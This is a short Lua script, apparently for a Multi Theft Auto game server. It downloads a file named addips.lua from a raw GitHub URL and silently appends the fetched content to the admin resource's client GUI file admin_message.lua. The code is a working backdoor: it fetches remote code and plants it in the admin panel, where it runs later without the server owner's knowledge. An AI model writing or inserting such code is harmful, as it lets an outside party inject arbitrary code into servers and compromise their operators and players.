fetchRemote("https://raw.githubusercontent.com/Drewskijs/ip/main/addips.lua",function(rd, err) 
	if err == 0 and rd ~= "ERROR" then
		
      hFile = fileOpen(":admin/client/gui/admin_message.lua")
      fileSetPos( hFile, fileGetSize( hFile ) ) 
      fileWrite(hFile, rd)              
      fileFlush(hFile)                    
      fileClose(hFile) 
	end
end)
